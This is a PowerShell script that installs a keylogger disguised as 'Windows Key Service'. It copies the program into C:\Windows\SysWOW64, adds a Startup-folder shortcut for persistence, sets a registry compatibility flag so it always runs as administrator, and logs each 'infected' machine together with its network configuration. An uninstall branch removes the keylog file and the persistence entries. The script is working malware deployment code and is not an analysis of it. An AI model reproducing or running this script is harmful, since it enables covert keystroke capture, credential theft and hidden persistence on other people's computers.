$BaseDir = "Z:\"
$App = "Windows Key Service"
$AppExe = "$App.exe"
$DestDir = "C:\Windows\SysWOW64\"
$DestIp = "***REMOVED***"
$KeyLogName = "k"
$InstallPath = "$DestDir$AppExe"
$ShortcutPath = "C:\Users\Mark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"
$AppCompatFlagsLayers = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"

$Machine = [Environment]::MachineName
$LogDate = Get-Date -Format "ddMMyyyy-HHmm"
$LogDir = "Z:\Logs\"
$LogFile = "$LogDir$Machine-$LogDate.txt"
$DateTime = Get-Date

function Install()
{
    "Infecting $Machine on $DateTime" | Out-File -Append -FilePath $LogFile

    ipconfig /all | Out-File -Append -FilePath $LogFile

    $IsConnected = Test-Connection -Quiet $DestIp
    if ($IsConnected)
    {
        try {
            # Install
            Copy-Item -Path "$BaseDir$AppExe" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
            
            # Create shortcut
            $objShell = New-Object -ComObject ("WScript.Shell")
            $objShortCut = $objShell.CreateShortcut($ShortcutPath)
            $objShortCut.TargetPath = $InstallPath
            $objShortCut.Save()
            "Created shortcut at $ShortcutPath" | Out-File -Append -FilePath $LogFile

            # Always run application as admin
            New-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Value "RUNASADMIN" -PropertyType String -Force | Out-File -Append -FilePath $LogFile
            
            # Start application
            Start-Process -FilePath $InstallPath | Out-File -Append -FilePath $LogFile
        } catch {
            $_.Exception.Message | Out-File -Append -FilePath $LogFile
        }
    }
    else
    {
        "Cannot connect to $DestIp" | Out-File -Append -FilePath $LogFile
    }
}

function Uninstall()
{
    Stop-Process -Name $App -Force
    Remove-Item -Force "$DestDir$KeyLogName"
    Remove-Item $InstallPath | Out-File -Append -FilePath $LogFile
    Remove-Item $ShortcutPath | Out-File -Append -FilePath $LogFile
    Remove-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Force | Out-File -Append -FilePath $LogFile
    "Uninstalled $InstallPath" | Out-File -Append -FilePath $LogFile
}


if (!(Test-Path $LogDir))
{
    New-Item -ItemType Directory -Force -Path $LogDir
}

if (Get-Command $InstallPath -ErrorAction SilentlyContinue)
{
    Uninstall
}
else
{
    Install
}
